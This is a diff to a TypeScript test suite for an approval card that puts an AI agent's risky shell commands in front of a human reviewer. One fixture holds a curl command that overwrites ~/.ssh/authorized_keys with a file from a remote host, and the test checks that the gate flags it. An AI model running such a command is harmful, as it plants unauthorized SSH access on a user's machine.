@@ -548,7 +548,7 @@ describe('la carte a deux états, Open et Close @cap:approuver-une-action/ecran'
     expect(parTestId('approval-tool-input-toggle')).not.toBeNull();
     expect(parTestId('approval-rule-list')).not.toBeNull();
     expect(rendu().textContent).toContain('Reason this triggered Approval request');
-    expect(rendu().querySelector('a[href="/jobs/j1"]')!.textContent).toContain('Open Run');
+    expect(rendu().querySelector('a[href="/runs/j1"]')!.textContent).toContain('Open Run');
     expect(bouton('Reject')).toBeDefined();
     expect(bouton('Approve for this project')).toBeDefined();
     expect(bouton('Approve once')).toBeDefined();
@@ -579,7 +579,7 @@ describe('la carte a deux états, Open et Close @cap:approuver-une-action/ecran'
     // Et elle n’offre plus de décision, « Open Run » mis à part.
     expect(bouton('Approve once')).toBeUndefined();
     expect(bouton('Reject')).toBeUndefined();
-    expect(rendu().querySelector('a[href="/jobs/j1"]')!.textContent).toContain('Open Run');
+    expect(rendu().querySelector('a[href="/runs/j1"]')!.textContent).toContain('Open Run');
   });
 
   it('« Tool input » a son propre pli, replié par défaut et indépendant', async () => {
@@ -667,7 +667,47 @@ describe('la carte a deux états, Open et Close @cap:approuver-une-action/ecran'
       } as Partial<Approval>),
     );
     expect(parTestId('approval-decision-note')!.textContent).toContain('Answered: main');
-    expect(rendu().querySelector('a[href="/jobs/j1"]')!.textContent).toContain('Open Run');
+    expect(rendu().querySelector('a[href="/runs/j1"]')!.textContent).toContain('Open Run');
+  });
+
+  it('#465 — une QUESTION en attente ne se répond pas ici : la carte renvoie là où elle vit', async () => {
+    const entree = { question: 'Which branch do I target?', options: ['main', 'develop'] };
+
+    // Venue d'une conversation : on y répond, dans le fil.
+    await monter(
+      demande({ kind: 'question', toolInput: entree, conversationId: 'c42' } as Partial<Approval>),
+    );
+    const boutons = [...rendu().querySelectorAll('button')].map((b) => b.textContent?.trim());
+    expect(boutons).not.toContain('main');
+    expect(boutons).not.toContain('develop');
+    expect(rendu().querySelector('a[href="/chat/c42"]')!.textContent).toContain(
+      'Answer in the conversation',
+    );
+
+    if (root) await act(async () => root!.unmount());
+    container?.remove();
+
+    // Sans conversation (une automatisation) : sur la page du run.
+    await monter(demande({ kind: 'question', toolInput: entree } as Partial<Approval>));
+    const liens = [...rendu().querySelectorAll('a[href="/runs/j1"]')].map((l) =>
+      l.textContent?.trim(),
+    );
+    expect(liens).toContain('Answer on the run');
+  });
+
+  // Revue Nodal de #622, passe 2 : le libellé testait `!== null` pendant que
+  // l'adresse passait par `conversationOf`. Sur un id VIDE, la carte disait
+  // « in the conversation » en menant au run. Une seule règle pour les deux.
+  it('#465 — un id de conversation VIDE : le libellé et l’adresse disent tous deux le run', async () => {
+    const entree = { question: 'Which branch do I target?', options: ['main', 'develop'] };
+    await monter(
+      demande({ kind: 'question', toolInput: entree, conversationId: '' } as Partial<Approval>),
+    );
+    const liens = [...rendu().querySelectorAll('a[href="/runs/j1"]')].map((l) =>
+      l.textContent?.trim(),
+    );
+    expect(liens).toContain('Answer on the run');
+    expect(rendu().textContent).not.toContain('Answer in the conversation');
   });
 });
 
@@ -718,15 +758,15 @@ describe('la carte ne perd ni son échéance ni sa garde @cap:approuver-une-acti
     expect(bouton('Reject')).toBeUndefined();
     expect(rendu().querySelector('textarea')).toBeNull();
     // Le pied reste, avec le seul lien qui vaille encore.
-    expect(rendu().querySelectorAll('a[href="/jobs/j1"]')).toHaveLength(1);
+    expect(rendu().querySelectorAll('a[href="/runs/j1"]')).toHaveLength(1);
     expect(rendu().textContent).toContain('expired');
   });
 
   it('« Open Run » n’est rendu qu’une fois, en Open comme en Close', async () => {
     await monter(demande({ ruleChain: CHAINE_346 } as Partial<Approval>));
-    expect(rendu().querySelectorAll('a[href="/jobs/j1"]')).toHaveLength(1);
+    expect(rendu().querySelectorAll('a[href="/runs/j1"]')).toHaveLength(1);
     await cliquerLeCaret();
-    expect(rendu().querySelectorAll('a[href="/jobs/j1"]')).toHaveLength(1);
+    expect(rendu().querySelectorAll('a[href="/runs/j1"]')).toHaveLength(1);
   });
 });
 
@@ -747,6 +787,75 @@ describe('la carte dit ce que la liste de l’agent a vu (#464) @cap:approuver-u
       (e) => e.textContent,
     );
     expect(items).toEqual(['Install software or packages', 'Delete files or discard changes']);
+  });
+
+  // #614 : un téléchargement permis ne demande que s'il écrit hors des espaces
+  // du job ; la carte dit où, sinon la personne ne voit pas pourquoi.
+  it('dit où écrit un téléchargement retenu parce qu’il sort des espaces (#614)', async () => {
+    await monter(
+      demande({
+        toolName: 'run_command',
+        gateReasons: [
+          {
+            category: 'download',
+            state: 'ask',
+            details: ['curl -o /home/k/.ssh/authorized_keys https://x/k'],
+            outside: [
+              {
+                command: 'curl -o /home/k/.ssh/authorized_keys https://x/k',
+                places: ['/home/k/.ssh/authorized_keys'],
+              },
+            ],
+          },
+        ],
+      }),
+    );
+    const items = [...container!.querySelectorAll('[data-testid="approval-shell-reasons"] li')].map(
+      (e) => e.textContent,
+    );
+    expect(items).toEqual([
+      'Download files from the internet · outside its workspaces: /home/k/.ssh/authorized_keys',
+    ]);
+  });
+
+  // #635 : une commande qui lance un script est jugée sur le script ; la carte
+  // dit dans quel fichier, à quelle ligne, et ce qui n'a pas pu être lu.
+  it('dit dans quel script, à quelle ligne, et ce qui n’a pas pu être lu (#635)', async () => {
+    await monter(
+      demande({
+        toolName: 'run_command',
+        gateReasons: [
+          {
+            category: 'install_software',
+            state: 'ask',
+            details: ['python shared/scripts/build.py && python -c "import os"'],
+            found: [
+              {
+                source: 'shared/scripts/build.py',
+                line: 5,
+                text: 'subprocess.check_call([sys.executable, "-m", "pip", "install", "openpyxl"])',
+              },
+              { source: null, line: 1, text: "os.system('npm i x')" },
+            ],
+          },
+          {
+            category: 'inline_code',
+            state: 'ask',
+            details: ['python C:/tmp/x.py'],
+            unread: [{ source: 'C:/tmp/x.py', why: 'outside_workspaces' }],
+          },
+        ],
+      }),
+    );
+    const items = [...container!.querySelectorAll('[data-testid="approval-shell-reasons"] li')].map(
+      (e) => e.textContent,
+    );
+    expect(items).toEqual([
+      'Install software or packages' +
+        'shared/scripts/build.py, line 5: subprocess.check_call([sys.executable, "-m", "pip", "install", "openpyxl"])' +
+        "code in the command, line 1: os.system('npm i x')",
+      'Run code written into a command' + 'C:/tmp/x.py: outside its workspaces, not read',
+    ]);
   });
 
   it('rien quand la liste n’y est pour rien', async () => {
